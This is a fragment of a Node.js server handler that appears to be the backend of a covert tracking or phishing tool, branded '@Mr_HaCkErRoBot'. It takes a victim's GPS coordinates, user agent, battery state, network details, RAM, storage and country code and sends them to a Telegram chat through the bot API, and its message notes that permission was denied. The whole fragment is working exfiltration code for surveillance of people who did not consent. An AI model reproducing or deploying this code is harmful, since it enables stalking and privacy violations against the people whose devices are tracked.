
batteryCharging,
      network_type: networkType,
      network_speed: networkSpeed,
      ram,
      storage,
      country_code: countryCode
    } = fields;

    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
    }

    try {
      const now = new Date();
      const dateTime = now.toLocaleString();

      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n⚡Powered by :- @Mr_HaCkErRoBot\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
        `*📌 New Data Received:*\n\n` +
        `*📍 Latitude:* ${latitude}\n` +
        `*📍 Longitude:* ${longitude}\n` +
        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
        `*📅 Date:* ${dateTime}\n` +
        `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
        `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
        `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
        `*📞 Selected Number:* User Denied\n` +
        `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
        `*💾 RAM:* ${ram || 'Unknown'} GB\n` +
        `*💽 Storage:* ${storage || 'Unknown'}\n` +
        `*🔒 Permission:* Denied`;

      const locationRes = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
      });

      const locResult = await locationRes.json();
      if (!locResult.ok) {
        return res.status(500).json({ ok: false, error: locResult.description });
      }

      const messageRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
      });

      const msgResult = await messageRes.json();
      if (!msgResult.ok) {
        return res.status(500).json({ ok: false, error: msgResult.description });
      }

      return res.status(200).json({ ok: true });
    } catch (error) {
      return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
    }
  });
};
